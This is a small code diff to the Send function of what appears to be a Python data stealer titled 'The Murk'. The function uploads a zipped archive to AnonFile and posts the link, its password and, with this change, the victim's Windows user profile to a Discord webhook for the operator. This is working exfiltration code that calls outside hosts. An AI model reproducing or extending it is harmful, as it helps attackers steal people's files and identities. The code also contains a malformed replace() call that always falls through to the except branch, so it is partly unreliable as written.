@@ -19,6 +19,7 @@ def Send(urlWebHook,botName,np):
 	try:
 		user = os.environ['USERPROFILE'].replace("C\\Users\\")
 	except:
+		PCuser = os.environ['USERPROFILE']
 		file = AnonFile()
 		upload = file.upload(rf'{np[0]}.zip')
 		try:
@@ -28,7 +29,7 @@ def Send(urlWebHook,botName,np):
 			print(e)
 		url = upload.url.geturl()
 		print(url)
-		massage = f'Link: {url}\nPassword: {np[1]}\n@everyone'
+		massage = f'User: {PCuser}\nLink: {url}\nPassword: {np[1]}\n@everyone'
 		hook = DiscordWebhook(url=urlWebHook, username=botName,content='**The Murk results**')
 		embed =DiscordEmbed(title=massage, color = 242424)
 		hook.add_embed(embed)
